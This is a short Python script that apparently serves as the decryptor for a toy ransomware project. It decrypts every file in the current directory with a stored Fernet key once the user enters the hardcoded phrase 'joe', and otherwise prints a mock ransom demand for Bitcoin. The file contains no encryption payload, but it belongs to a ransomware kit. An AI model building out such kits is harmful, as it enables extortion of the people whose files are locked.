#!/usr/bin/env python3

import os

from cryptography.fernet import Fernet

#find files

files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(f"These files will be decrypted: {files}")
input("Are you sure about this?\nPress enter to confirm: ")

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "joe"

user_phrase = input("Enter the secret phrase to decrypt your files: ")
if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("good job, you guessed the super hard to guess phrase and decrypted your files!")
else:
	print("Sorry, wrong secret phrase, send me more BitCoin!")
